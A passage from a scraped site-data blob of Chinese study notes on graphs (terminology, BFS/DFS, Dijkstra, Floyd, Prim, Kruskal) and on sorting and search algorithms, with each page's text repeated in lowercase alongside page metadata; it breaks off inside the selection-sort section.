图(Graph)是一组由边连接的节点（顶点）。是网络结构的抽象模型，可以表示任何二元关系。\n    数学表达：G = (V, E)，其中V是一组顶点，E是一组边连接V中顶点的边。\n\n\n术语：\n    相邻顶点：一条边连接在一起的顶点。例如上面的“无向图”中的A和B相邻，A和C相邻，A和D相邻，A和E不相邻。\n    度：一个顶点的相邻顶点数量。例如上面的“无向图”中，A的度是3，E的度是2，D的度是4。\n    路径：一些相邻顶点与边一起构成的路径，顶点v1、v2、v3、v4...vn的一个连续序列，其中vi和vi+1是相邻顶点，也就是路径上连续的点都是相邻的。例如上面的“无向图”中，A-C-G-D-H。\n    简单路径：路径上不包含重复的顶点。\n    环：除了第一个顶点和最后一个顶点以外，没有重复顶点的简单路径。例如上面的“无向图”中：A-C-G-D-A。\n    连通的：两个顶点间存在边，那么这两个点是相通的。如果一个图中任意两个顶点都是连通的，那么这个图就是连通图。例如上面的“有向图”中：A和C是连通的，F和G是不连通的，该图不是连通图。\n    无向的：两个顶点间的边是没有方向的。反之就是有向的。例如上图中的“无向图”和“有向图”。\n    强连通：双向的连通就是强连通，单向的连通是普通连通。例如上面的“有向图”中：A和C是普通连通的，C和D是强连通的。\n    出度：该顶点的指向相邻顶点的数量。入度：相邻顶点的指向该顶点的数量。例如上面的“有向图”中，A的出度是3而入度是0。\n    权：边被赋予了权值。例如上面的“加权图”。\n\n\n# 图的表示\n\n    邻接矩阵：用一个矩阵（二维数组）来表示每两个顶点之间的关系。如果索引 i 所在顶点与索引 j 所在顶点是相邻的，那么array[i][j] = 1，否则就为0。\n\n    邻接表：由图中每个顶点的相邻顶点列表组成。可以用数组、链表、字典、散列表来表示相邻顶点列表。\n\n    关联矩阵：矩阵的行表示顶点，列表示边。使用二维数组来表示顶点与边的关系，如果顶点是边的入射点就是为1，否则为0。\n\n\n\n# 图的实现\n\n    图的实现代码细节：graph.ts\n\n    声明一个私有变量_isDirected代表图是否是有向图，声明一个私有变量_vertices来存储图的顶点，声明一个私有变量_adjList存储某个顶点的邻接顶点。\n\n    addVertex方法：给图添加顶点。\n\npublic addVertex(vertex: string | number) {\n    // 顶点不存在才添加，includes是ES2016方法\n    if (!this._vertices.includes(vertex)) {\n        this._vertices.push(vertex);\n        // 邻接顶点的存放采用map结构\n        this._adjList.set(vertex, []);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n    addEdge方法：添加边。\n\npublic addEdge(v: string | number, w: string | number) {\n    // v没有加进顶点数组里就会新添加进去\n    if (!this._adjList.get(v)) {\n        this.addVertex(v);\n    }\n    // w没有加进顶点数组里就会新添加进去\n    if (!this._adjList.get(w)) {\n        this.addVertex(w);\n    }\n    this._adjList.get(v).push(w);\n    // 无向图才会认为两者彼此相邻。\n    // 如果是单向的就调用一次addEdge，双向就调用两次addEdge\n    if (!this._isDirected) {\n        this._adjList.get(w).push(v); // 无向\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 图的遍历\n\n    图遍历算法的思想：追踪一个顶点，然后访问它的邻接顶点；如果它的邻接顶点还没有被访问过，那么将它的邻接顶点加到待访问列表中；然后从待访问列表中取下一个顶点去追踪，再使用相同的处理方法。当图中所有顶点被完全探索了，该图就遍历完了。\n    完全探索：某顶点的所有邻接顶点被访问了一次后（或没有邻接顶点），该顶点就被完全探索完了。（完全探索完的顶点至多被访问两次）\n\n    图的遍历有两种：广度优先搜索(BFS) 和 深度优先搜索(DFS)。他们拥有相同的图遍历思想，不同之处：BFS会把顶点所有的邻接顶点先遍历完；而DFS是沿一条路径深入遍历。\n    数据结构层面上，广度优先搜索采用的是 队列，深度优先搜索采用的是 栈。\n\n\n# 广度优先搜索\n\n    广度优先搜索的实现代码细节：breadth-first-search.ts\n\n    遍历时，顶点至多被访问两次，也就是三种状态：未被访问过（白色）、待第二次访问（灰色）、完全探索完（黑色）。所以在图数据初始化后，还需要给图构造对应的颜色信息。\n    选一个开始点开始遍历，广度优先搜索的待访问列表用 队列 来实现，将这个开始点先置为灰色，再加入 队列尾部。\n    从 队列的首部 取出顶点，如果这个顶点有 白色 的邻接顶点，就将这些白色的邻接顶点一一加入 队列尾部，并置为 灰色；当该顶点的 所有邻接顶点 处理完毕后，将该顶点置为 黑色。\n    队列不为空 就继续上一步操作，否则结束操作，遍历完成。\n\n\n    我们可以在使用BFS求出每个点到开始点的距离和它们之间的回溯点。在初始化定义一个距离变量和回溯点遍历，同颜色信息一样。在加入待访问列表（队列）时，就将距离信息和回溯点更新。当遍历完，就可得出所有顶点与开始点的距离和回溯点。\n\n\n# 深度优先搜索\n\n    深度优先搜索的实现代码细节：depth-first-search.ts\n\n    跟广度优先搜索一样，也是三种状态：白色、灰色、黑色。在图数据初始化后，还需要给图构造对应的颜色信息。\n    选一个开始点开始遍历，深度优先搜索的待访问列表用 栈 来实现，将这个开始点先置为灰色，再加入 栈顶部。\n    查看 栈顶 顶点，如果这个顶点有 白色 的邻接顶点，就将第一个白色邻接顶点加到 栈顶，并置为 灰色；如果这个顶点 没有白色邻接顶点了，则将该顶点置为 黑色。\n    栈不为空 就继续上一步操作，否则结束操作，遍历完成。\n\n\n    我们可以在使用DFS求出每个点距离开始点的发现时间和完全探索完的时间还有它们之间的回溯点（用时和拓扑排序）。在初始化定义三个变量分别存储那三个信息，同颜色信息一样。在加入待访问列表（队列）时，就将发现时间和回溯点更新；在该顶点探索完毕就更新完全探索时间。当遍历完，就可得出所有顶点与开始点的之间发现时间和完全探索完的时间还有回溯点。\n    拓扑排序就是对任务或步骤进行排序，允许其中有步骤可以对换。比如一本书的章节，整体章节有顺序，但其中别个章节其实可以提前并不影响整体。而拓扑排序主要在有向无环图中并搭配深度优先遍历使用的。\n\n\n\n# 最短路径算法\n\n\n# 迪杰斯特拉(Dijkstra)算法\n\n    迪杰斯特拉(Dijkstra)算法的实现代码细节：dijkstra.ts\n\n    迪杰斯特拉(Dijkstra)是图里每个顶点到单个源顶点的最短距离的 贪心算法。因为有权重的原因，我们选择的是邻接矩阵，更容易计算。核心就是，记录每个顶点到源顶点的距离，每次找出里源顶点最近并可访问的顶点，进而算出它所有的邻接顶点里源顶点的距离，如果算出来的更小就覆盖原邻接顶点的最短距离（局部最优），然后该顶点再置为不可访问的，重复之前的步骤直至所有顶点都访问完。\n    与BFS的 区别一 ：BFS使用队列存储待访问列表，而迪杰斯特拉(Dijkstra)是使用“包含所有顶点的数组（顶点要可访问）”存储待访问列表；\n    区别二 ：BFS拿的队列首部顶点去处理的，迪杰斯特拉(Dijkstra)算法中拿的是数组中距离源顶点距离最短并可访问的顶点；\n    区别三 ：迪杰斯特拉(Dijkstra)算法中的最短距离并非只有一次计算他是可覆盖的，而BFS是一次计算后不变，它非常依赖于当时构造边信息的先后顺序或者算法细节。\n\n\n# 弗洛伊德(Floyd)算法\n\n    弗洛伊德(Floyd)算法的实现代码细节：floyd-warshall.ts\n\n    弗洛伊德(Floyd)算法是图里每个顶点到多个源顶点的最短距离的 动态规划算法。采用一个中间点，如果开始点到中间点的距离加上中间点到结束点的距离，要小于 开始点到结束点的距离，就将更新“开始点到结束点的距离”的值为那个小的值。\n\n\n# 最小生成树\n\n    例如：在一群岛屿之间架桥，实现它们的相互连通，怎样建造会造价最小呢？\n    用加权无向图来描述原问题，然后求它的最小生成树。最小生成树(MST)的特点：有n个顶点对应有n-1条边连接它们，这些边的总权值在原图中是最小的。\n\n\n\n# 普里姆(Prim)算法\n\n    普里姆(Prim)算法的实现代码细节：prim.ts\n\n    普里姆(Prim)算法是求解加权无向图问题的 贪心算法。它跟迪杰斯特拉(Dijkstra)算法非常相似，最主要的区别就是prim无需加上回溯点的代价再去比较。因为我们只需要求出最小代价的树，无需管当前顶点和源顶点是什么关系。（最小生成树的最小代价和最短路径的区别）\n\n\n# 克鲁斯卡尔(Kruskal)算法\n\n    克鲁斯卡尔(Kruskal)算法的实现代码细节：kruskal.ts\n\n    普里姆(Prim)算法是以顶点为视角，它适合边很稠密的场景，如果边分布很稀疏的话，我们可以以边为视角，也就是克鲁斯卡尔(Kruskal)算法（也是一种 贪心算法）。\n    值得注意的是，在实现算法过程中，多个边连在一起很容易形成环，所以在算法中一定要主要判断边加进来的预期效果是否会形成环。在普里姆(Prim)算法中无需担心，因为在实现的时候，以三个相邻顶点的某个顶点为视角，其两条边只取一个权值最小的。",normalizedContent:"# 图\n\n\n# 图的相关术语\n\n    图(graph)是一组由边连接的节点（顶点）。是网络结构的抽象模型，可以表示任何二元关系。\n    数学表达：g = (v, e)，其中v是一组顶点，e是一组边连接v中顶点的边。\n\n\n术语：\n    相邻顶点：一条边连接在一起的顶点。例如上面的“无向图”中的a和b相邻，a和c相邻，a和d相邻，a和e不相邻。\n    度：一个顶点的相邻顶点数量。例如上面的“无向图”中，a的度是3，e的度是2，d的度是4。\n    路径：一些相邻顶点与边一起构成的路径，顶点v1、v2、v3、v4...vn的一个连续序列，其中vi和vi+1是相邻顶点，也就是路径上连续的点都是相邻的。例如上面的“无向图”中，a-c-g-d-h。\n    简单路径：路径上不包含重复的顶点。\n    环：除了第一个顶点和最后一个顶点以外，没有重复顶点的简单路径。例如上面的“无向图”中：a-c-g-d-a。\n    连通的：两个顶点间存在边，那么这两个点是相通的。如果一个图中任意两个顶点都是连通的，那么这个图就是连通图。例如上面的“有向图”中：a和c是连通的，f和g是不连通的，该图不是连通图。\n    无向的：两个顶点间的边是没有方向的。反之就是有向的。例如上图中的“无向图”和“有向图”。\n    强连通：双向的连通就是强连通，单向的连通是普通连通。例如上面的“有向图”中：a和c是普通连通的，c和d是强连通的。\n    出度：该顶点的指向相邻顶点的数量。入度：相邻顶点的指向该顶点的数量。例如上面的“有向图”中，a的出度是3而入度是0。\n    权：边被赋予了权值。例如上面的“加权图”。\n\n\n# 图的表示\n\n    邻接矩阵：用一个矩阵（二维数组）来表示每两个顶点之间的关系。如果索引 i 所在顶点与索引 j 所在顶点是相邻的，那么array[i][j] = 1，否则就为0。\n\n    邻接表：由图中每个顶点的相邻顶点列表组成。可以用数组、链表、字典、散列表来表示相邻顶点列表。\n\n    关联矩阵：矩阵的行表示顶点，列表示边。使用二维数组来表示顶点与边的关系，如果顶点是边的入射点就是为1，否则为0。\n\n\n\n# 图的实现\n\n    图的实现代码细节：graph.ts\n\n    声明一个私有变量_isdirected代表图是否是有向图，声明一个私有变量_vertices来存储图的顶点，声明一个私有变量_adjlist存储某个顶点的邻接顶点。\n\n    addvertex方法：给图添加顶点。\n\npublic addvertex(vertex: string | number) {\n    // 顶点不存在才添加，includes是es2016方法\n    if (!this._vertices.includes(vertex)) {\n        this._vertices.push(vertex);\n        // 邻接顶点的存放采用map结构\n        this._adjlist.set(vertex, []);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n    addedge方法：添加边。\n\npublic addedge(v: string | number, w: string | number) {\n    // v没有加进顶点数组里就会新添加进去\n    if (!this._adjlist.get(v)) {\n        this.addvertex(v);\n    }\n    // w没有加进顶点数组里就会新添加进去\n    if (!this._adjlist.get(w)) {\n        this.addvertex(w);\n    }\n    this._adjlist.get(v).push(w);\n    // 无向图才会认为两者彼此相邻。\n    // 如果是单向的就调用一次addedge，双向就调用两次addedge\n    if (!this._isdirected) {\n        this._adjlist.get(w).push(v); // 无向\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 图的遍历\n\n    图遍历算法的思想：追踪一个顶点，然后访问它的邻接顶点；如果它的邻接顶点还没有被访问过，那么将它的邻接顶点加到待访问列表中；然后从待访问列表中取下一个顶点去追踪，再使用相同的处理方法。当图中所有顶点被完全探索了，该图就遍历完了。\n    完全探索：某顶点的所有邻接顶点被访问了一次后（或没有邻接顶点），该顶点就被完全探索完了。（完全探索完的顶点至多被访问两次）\n\n    图的遍历有两种：广度优先搜索(bfs) 和 深度优先搜索(dfs)。他们拥有相同的图遍历思想，不同之处：bfs会把顶点所有的邻接顶点先遍历完；而dfs是沿一条路径深入遍历。\n    数据结构层面上，广度优先搜索采用的是 队列，深度优先搜索采用的是 栈。\n\n\n# 广度优先搜索\n\n    广度优先搜索的实现代码细节：breadth-first-search.ts\n\n    遍历时，顶点至多被访问两次，也就是三种状态：未被访问过（白色）、待第二次访问（灰色）、完全探索完（黑色）。所以在图数据初始化后，还需要给图构造对应的颜色信息。\n    选一个开始点开始遍历，广度优先搜索的待访问列表用 队列 来实现，将这个开始点先置为灰色，再加入 队列尾部。\n    从 队列的首部 取出顶点，如果这个顶点有 白色 的邻接顶点，就将这些白色的邻接顶点一一加入 队列尾部，并置为 灰色；当该顶点的 所有邻接顶点 处理完毕后，将该顶点置为 黑色。\n    队列不为空 就继续上一步操作，否则结束操作，遍历完成。\n\n\n    我们可以在使用bfs求出每个点到开始点的距离和它们之间的回溯点。在初始化定义一个距离变量和回溯点遍历，同颜色信息一样。在加入待访问列表（队列）时，就将距离信息和回溯点更新。当遍历完，就可得出所有顶点与开始点的距离和回溯点。\n\n\n# 深度优先搜索\n\n    深度优先搜索的实现代码细节：depth-first-search.ts\n\n    跟广度优先搜索一样，也是三种状态：白色、灰色、黑色。在图数据初始化后，还需要给图构造对应的颜色信息。\n    选一个开始点开始遍历，深度优先搜索的待访问列表用 栈 来实现，将这个开始点先置为灰色，再加入 栈顶部。\n    查看 栈顶 顶点，如果这个顶点有 白色 的邻接顶点，就将第一个白色邻接顶点加到 栈顶，并置为 灰色；如果这个顶点 没有白色邻接顶点了，则将该顶点置为 黑色。\n    栈不为空 就继续上一步操作，否则结束操作，遍历完成。\n\n\n    我们可以在使用dfs求出每个点距离开始点的发现时间和完全探索完的时间还有它们之间的回溯点（用时和拓扑排序）。在初始化定义三个变量分别存储那三个信息，同颜色信息一样。在加入待访问列表（队列）时，就将发现时间和回溯点更新；在该顶点探索完毕就更新完全探索时间。当遍历完，就可得出所有顶点与开始点的之间发现时间和完全探索完的时间还有回溯点。\n    拓扑排序就是对任务或步骤进行排序，允许其中有步骤可以对换。比如一本书的章节，整体章节有顺序，但其中别个章节其实可以提前并不影响整体。而拓扑排序主要在有向无环图中并搭配深度优先遍历使用的。\n\n\n\n# 最短路径算法\n\n\n# 迪杰斯特拉(dijkstra)算法\n\n    迪杰斯特拉(dijkstra)算法的实现代码细节：dijkstra.ts\n\n    迪杰斯特拉(dijkstra)是图里每个顶点到单个源顶点的最短距离的 贪心算法。因为有权重的原因，我们选择的是邻接矩阵，更容易计算。核心就是，记录每个顶点到源顶点的距离，每次找出里源顶点最近并可访问的顶点，进而算出它所有的邻接顶点里源顶点的距离，如果算出来的更小就覆盖原邻接顶点的最短距离（局部最优），然后该顶点再置为不可访问的，重复之前的步骤直至所有顶点都访问完。\n    与bfs的 区别一 ：bfs使用队列存储待访问列表，而迪杰斯特拉(dijkstra)是使用“包含所有顶点的数组（顶点要可访问）”存储待访问列表；\n    区别二 ：bfs拿的队列首部顶点去处理的，迪杰斯特拉(dijkstra)算法中拿的是数组中距离源顶点距离最短并可访问的顶点；\n    区别三 ：迪杰斯特拉(dijkstra)算法中的最短距离并非只有一次计算他是可覆盖的，而bfs是一次计算后不变，它非常依赖于当时构造边信息的先后顺序或者算法细节。\n\n\n# 弗洛伊德(floyd)算法\n\n    弗洛伊德(floyd)算法的实现代码细节：floyd-warshall.ts\n\n    弗洛伊德(floyd)算法是图里每个顶点到多个源顶点的最短距离的 动态规划算法。采用一个中间点，如果开始点到中间点的距离加上中间点到结束点的距离，要小于 开始点到结束点的距离，就将更新“开始点到结束点的距离”的值为那个小的值。\n\n\n# 最小生成树\n\n    例如：在一群岛屿之间架桥，实现它们的相互连通，怎样建造会造价最小呢？\n    用加权无向图来描述原问题，然后求它的最小生成树。最小生成树(mst)的特点：有n个顶点对应有n-1条边连接它们，这些边的总权值在原图中是最小的。\n\n\n\n# 普里姆(prim)算法\n\n    普里姆(prim)算法的实现代码细节：prim.ts\n\n    普里姆(prim)算法是求解加权无向图问题的 贪心算法。它跟迪杰斯特拉(dijkstra)算法非常相似，最主要的区别就是prim无需加上回溯点的代价再去比较。因为我们只需要求出最小代价的树，无需管当前顶点和源顶点是什么关系。（最小生成树的最小代价和最短路径的区别）\n\n\n# 克鲁斯卡尔(kruskal)算法\n\n    克鲁斯卡尔(kruskal)算法的实现代码细节：kruskal.ts\n\n    普里姆(prim)算法是以顶点为视角，它适合边很稠密的场景，如果边分布很稀疏的话，我们可以以边为视角，也就是克鲁斯卡尔(kruskal)算法（也是一种 贪心算法）。\n    值得注意的是，在实现算法过程中，多个边连在一起很容易形成环，所以在算法中一定要主要判断边加进来的预期效果是否会形成环。在普里姆(prim)算法中无需担心，因为在实现的时候，以三个相邻顶点的某个顶点为视角，其两条边只取一个权值最小的。",charsets:{cjk:!0}},{title:"11.排序和搜索算法",frontmatter:{title:"11.排序和搜索算法"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/11.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95.html",relativePath:"book-web/数据结构与算法/11.排序和搜索算法.md",key:"v-3850d23a",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/11.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95.html",headers:[{level:2,title:"排序算法",slug:"排序算法",normalizedTitle:"排序算法",charIndex:14},{level:3,title:"冒泡排序",slug:"冒泡排序",normalizedTitle:"冒泡排序",charIndex:23},{level:3,title:"选择排序",slug:"选择排序",normalizedTitle:"选择排序",charIndex:327},{level:3,title:"插入排序",slug:"插入排序",normalizedTitle:"插入排序",charIndex:789},{level:3,title:"希尔排序",slug:"希尔排序",normalizedTitle:"希尔排序",charIndex:1041},{level:3,title:"归并排序",slug:"归并排序",normalizedTitle:"归并排序",charIndex:1940},{level:3,title:"快速排序",slug:"快速排序",normalizedTitle:"快速排序",charIndex:1709},{level:3,title:"计数排序",slug:"计数排序",normalizedTitle:"计数排序",charIndex:2660},{level:3,title:"桶排序",slug:"桶排序",normalizedTitle:"桶排序",charIndex:3106},{level:3,title:"基数排序",slug:"基数排序",normalizedTitle:"基数排序",charIndex:3587},{level:3,title:"堆排序",slug:"堆排序",normalizedTitle:"堆排序",charIndex:1736},{level:2,title:"搜索算法",slug:"搜索算法",normalizedTitle:"搜索算法",charIndex:5},{level:3,title:"顺序搜索（线性搜索）",slug:"顺序搜索-线性搜索",normalizedTitle:"顺序搜索（线性搜索）",charIndex:3916},{level:3,title:"二分搜索",slug:"二分搜索",normalizedTitle:"二分搜索",charIndex:4037},{level:3,title:"内插搜索",slug:"内插搜索",normalizedTitle:"内插搜索",charIndex:4239},{level:2,title:"随机算法",slug:"随机算法",normalizedTitle:"随机算法",charIndex:4566},{level:3,title:"Fisher-Yates随机",slug:"fisher-yates随机",normalizedTitle:"fisher-yates随机",charIndex:4575}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"排序算法 冒泡排序 选择排序 插入排序 希尔排序 归并排序 快速排序 计数排序 桶排序 基数排序 堆排序 搜索算法 顺序搜索（线性搜索） 二分搜索 内插搜索 随机算法 Fisher-Yates随机",content:"# 排序和搜索算法\n\n\n# 排序算法\n\n\n# 冒泡排序\n\n    冒泡排序代码细节：bubble-sort.ts\n\n    冒泡排序(bubble-sort)：每轮都比较数组里相邻两项，如果左项大于右项就交换彼此，目的是每轮都让最大的移到数组末尾，所有轮结束后数组就是升序排序的了（降序是将最小移到末尾）。\n\n    值得注意的是，在每轮都将最大的冒泡到末尾后，在下一轮时是无需再处理末尾项了，所以在内部循环时要记得减去 i 。还有就是如果某轮里，没有交换过左右项，那么可以提前退出算法，因为上一轮排完凑巧就排完了。\n\n    平均、最差场景的时间复杂度是O(n^2)，最好情况是O(n)；空间复杂度是O(1)，相邻项交换是常量级的临时空间。\n\n\n\n# 选择排序\n\n    选择排序代码细节：selection-sort.ts\n\n    选择排序(selection-sort)：每轮从数组里选一个比目标项小并且是最小的项（剩余项里最小的），记住它的下标，在每轮结束时交换目标项与该项的值，所有轮结束后数组就是升序的了。\n\n    值得注意的是，在每轮都找出比目标项小的项，这个项还要在剩余项里最小，所以每轮的j都是从i+1开始的，还要记住最小项的索引。\n\n    选择排序与冒泡排序的相同点：都是比较当前项和目标项的大小，并且每轮都让最大或最小项移到数组的一边。其实就是从剩余项中找出最大或最小项，然后排到数组的一端。\n    选择排序与冒泡排序的不同点：冒泡排序是一直交换当前项和目标项以达到目的；选择排序是记住最大或最小项的位置，到一轮快结束时才交换以达到目的。\n    两者核心思想相似，但处理手段不同，这也决定它们的最差、平均时间复杂度都是O(n^2)，空间复杂度都是O(1)。而选择排序的最好时间复杂度还是O(n^2)不能提前退出，因为它减少了交换次数。\n\n\n\n# 插入排序\n\n    插入排序代码细节：insertion-sort.ts\n\n    与冒泡和选择两种排序不同的是，插入排序(insertion-sort) 不会从剩余项中找最大或最小项放入数组一端，它是每轮从剩余项中随意取一项（默认取第一个），将它与排好序的项进行比较，然后放入适当的位置；一直到剩余项都处理完。\n\n    可以说插入排序是反其道而行，随意从剩余项中取一项然后按顺序插入已排序列表里，例如插扑克牌。最差、平均时间复杂度是O(n^2)，最好情况是O(n)；空间复杂度是O(1)。\n\n\n\n# 希尔排序\n\n    希尔排序代码细节：shell-sort.ts\n\n    希尔排序(shell-sort)：先取一个增量k（可以是数组长度的一半，也可以是更好的增量取法），对数组里所有互相隔k距离的元素进行插入排序；下一轮将增量折半（或者更好增量取法），重复之前的步骤，直到增量为1（最后一个增量必须为1）并执行完插入排序后结束整个算法。\n\n    折半式增量是最先提出来的，其最好情况下的时间复杂度为O(n)，平均时间复杂度为O(n^(1.3))，最坏时间复杂度是O(n^2)。\n\n    Hibbard在1963年提出的[1, 3, 7, ..., 2^n-1]这样的增量序列，特点是没有公因子。其最坏时间复杂度是O(n^(3/2))，其平均时间复杂度被模拟出来是O(n^(5/4))。\n\n    Sedgewick在1982年提出[1, 8, 23, 77, 281, 1073, 4193, 16577...]，除了第一项的通项公式：4 * 2^(2 * i) + 3 * 2^i + 1（其中i为0,1,2,3,4...）；又在1986年提出[1, 5, 19, 41, 109, ...]（偶数项的通项公式：9 * 2^i - 9 * 2^(i/2) + 1，奇数项的通项公式：8 * 2^i - 6 * 2^((i+1)/2) + 1）。Sedgewick提出的几种，最坏情形时间复杂度是O(n^(4/3))，平均时间复杂度猜测在O(n^(7/6))，要比Hibbard好很多\n\n    希尔排序是基于插入排序的，它没有快速排序快（如果有合适的增量序列，在小规模数组中将会比堆排序、快速排序快），但在中等规模表现良好，涉及到大规模数据将不如快速排序。有一个在大规模数据中表现优异的增量序列是（斐波那契数列除去0和1将剩余的数以黄金分割比的两倍的幂进行运算得到的数列）：(1, 9, 34, 182, 836, 4025, 19001, 90358, 428481, 2034035, 9651787, 45806244, 217378076, 1031612713,…)\n\n\n\n# 归并排序\n\n    归并排序代码细节：merge-sort.ts\n\n    归并排序(merge-sort) 跟冒泡、选择、插入三种排序方式区别很大，它运用了分而治之的思想。一直将数组分割成长度近似的两段，直到长度为1不可分割；再将其一一合并，归并的过程中会将左右两边的元素进行依次排序（从左右分别拿一项进行比较，排好序放入新数组，直到左右其中一个里元素被取完，而剩余的也会被连接到新数组），最后合并得到的新数组就是排好序的数组。\n\n    最差、平均、最好时间复杂度都是O(nlogn)；空间复杂度是O(n)，因为在每次合并的过程中都使用了一个临时数组存储。\n\n\n\n# 快速排序\n\n    快速排序代码细节：quick-sort.ts\n\n    快速排序(quick-sort)：将数组分隔成两段，分隔时会对数组进行简单排序，将较小项移到分隔点左边，对应右边是较大项。但由于左右两边里面也没顺序，那将左右两边也进行分隔处理，直到不能再分隔，这样使得每个小段都有了顺序，进而整段也是有了顺序。\n    这样看来快速排序也是分而治之的一种应用，跟归并排序很像，两者区别就是：一个是分开时简单分类（大致顺序）后面直接合并， 另一个是分开时不处理后面合并时再排序。\n\n    快速排序的空间复杂度都是O(1)，没有每轮借助临时数组；快速排序的最好、平均时间复杂度都是O(nlogn)；最差时间复杂度是O(n^2)，因为当数组原本是降序的，要求排成升序的，并且基准点取的是最左边时，算出的下一轮的基准点还是最左边（一般返回给下一轮的应该是中间点），这就导致它没有了左右两边数组的递归了，而是就是它本身去排序了，退化成n^2这样的排序了。\n\n\n\n# 计数排序\n\n    计数排序代码细节：counting-sort.ts\n\n    计数排序(counting-sort)：目标数组有n个元素，其中最大值为k；先构造一个长度为k+1的统计数组，这个统计数组的索引对应着目标数组里的元素值；然后去统计目标数组里每个元素出现的次数，存储到统计数组对应索引上（次数分布到统计数组里）；最后遍历统计数组，将其索引当作新项加到新数组里，而“次数”是有几次就给新数组加同样的项几次。\n\n    值得注意的是，此方法很局限，它适合对小范围的非负整数的数组进行排序；当n不大而k很大时，是不适合使用计数排序的，因为会导致统计数组的长度过长。\n\n    计数排序的空间复杂度是O(n+k)，因为它额外使用了一个k+1长的统计数组。平均的时间复杂度是O(n+k)，最后由统计数组到新数组时，先遍历了k次，再此基础上还总共遍历了n次插入重复值；当k=n时也就是最好时间复杂度是O(n)；当k远大于n，而n很小，主要依赖于k，所以最差时间复杂度是O(k)。\n\n\n\n# 桶排序\n\n    桶排序代码细节：bucket-sort.ts\n\n    桶排序(bucket-sort)：跟计数排序类似，只是我们准备的不是统计数组，而是桶这样的二维数组；遍历目标数组，将每个元素按照大小分配到对应的桶里（将元素分布到桶里）；所有元素遍历完后，桶之间是有顺序的但桶内部是没有顺序的，这里我们就需要对桶内部进行排序，一般选择快速排序或插入排序；每个桶都排完序后，将桶合并就会得到排好序的数组。\n\n    尽量将n个数据平均分配到k个桶中，这样每个桶就有n/k个数据量；尽量的增大桶的数量，极限情况下每个桶只能得到一个数据，这样就完全避开了桶内数据的排序操作。当然，做到这一点很不容易，数据量巨大的情况下，会使得桶的数量巨大，空间浪费严重。这就是一个时间代价和空间代价的权衡问题了。\n\n    对于n个待排数据，k个桶，平均每个桶n/k个数据这样情景的平均时间复杂度为：O(n)+O(k*(n/k)*log(n/k))=O(n+nlog(n/k))。当k=n时，是最好效率的排序，也就是最好时间复杂度是O(n)。空间复杂度是O(n+k)\n\n\n\n# 基数排序\n\n    基数排序代码细节：radix-sort.ts\n\n    基数排序(radix-sort)：一种特殊的桶排序，主要是对整数或字符串的每一位进行排序，可以从低位开始也可以从高位开始；桶的数量（基数）就是一个数的进制数。例如数组是十进制整数的，那么桶数（基数）就是10，分别是从0到9这样的10个桶；然后依次从个位、十位、百位、千位这样从低到高进行每一轮排序，结束后每位上都是相对有序的，整体上也是有序的。\n\n    如果数组里的元素是位数比较多的整数，那么就适合从高位开始排，位数比较低的就适合从低位开始排；时间空间复杂度都是O(n*k)，k是元素的位数。\n\n\n\n# 堆排序\n\n    在前面章节已经说过了：堆排序\n\n\n# 搜索算法\n\n\n# 顺序搜索（线性搜索）\n\n    顺序搜索（线性搜索）代码细节：sequential-search.ts\n\n    顺序搜索（线性搜索）：遍历该线性数据结构，将每个元素和要找的元素一一进行对比，如果相同就立即返回结果，不同就继续查找。\n\n\n# 二分搜索\n\n    二分搜索代码细节：binary-search.ts\n\n    二分搜索：\n        1.在待选区间里选择中间值，如果中间值就是待搜索值，就直接返回；\n        2.如果待搜索值比中间值要小，就将目前区间的左区间（较小区间）作为待选区间，然后重复步骤1；\n        3.如果待搜索值比中间值要大，就将目前区间的右区间（较大区间）作为待选区间，然后重复步骤1。\n\n\n# 内插搜索\n\n    内插搜索代码细节：interpolation-search.ts\n\n    内插搜索：改良版的二分搜索，要在步骤1中使用一个特殊公式去选定一个值。\n        1.在待选区间里利用公式选定一个值，如果选定值就是待搜索值，就直接返回；\n        2.如果待搜索值比选定值要小，就将目前区间的左区间（较小区间）作为待选区间，然后重复之前步骤；\n        3.如果待搜索值比选定值要大，就将目前区间的右区间（较大区间）作为待选区间，然后重复之前步骤。\n\n    公式是这样的，先算出搜索值在“max和min的差值”的“占比”，再将“max的索引和min的索引的差值”乘以这个“占比”，就可以大致推断出搜索值的索引。\n\n\n# 随机算法\n\n\n# Fisher-Yates随机\n\n    Fisher-Yates随机代码细节：fisher–yates.ts\n\n    Fisher-Yates随机：从最后一项开始并将当前位置和一个随机位置进行交换，这个随机位置要比当前位置小。",normalizedContent:"# 排序和搜索算法\n\n\n# 排序算法\n\n\n# 冒泡排序\n\n    冒泡排序代码细节：bubble-sort.ts\n\n    冒泡排序(bubble-sort)：每轮都比较数组里相邻两项，如果左项大于右项就交换彼此，目的是每轮都让最大的移到数组末尾，所有轮结束后数组就是升序排序的了（降序是将最小移到末尾）。\n\n    值得注意的是，在每轮都将最大的冒泡到末尾后，在下一轮时是无需再处理末尾项了，所以在内部循环时要记得减去 i 。还有就是如果某轮里，没有交换过左右项，那么可以提前退出算法，因为上一轮排完凑巧就排完了。\n\n    平均、最差场景的时间复杂度是o(n^2)，最好情况是o(n)；空间复杂度是o(1)，相邻项交换是常量级的临时空间。\n\n\n\n# 选择排序\n\n    选择排序代码细节：selection-sort.ts\n\n    选择排序(selection-sort)：每轮从数组里选一个比目标项小并且是最小的项（剩余项里最小的），记住它的下标，在每轮结束时交换目标项与该项的值，所有轮结束后数组就是升序的了。\n\n    值得注意的是，在每轮都找出比目标项小的项，这个项还要在剩余项里最小，所以每轮的j都是从i+1开始的，还要记住最小项的索引。\n\n    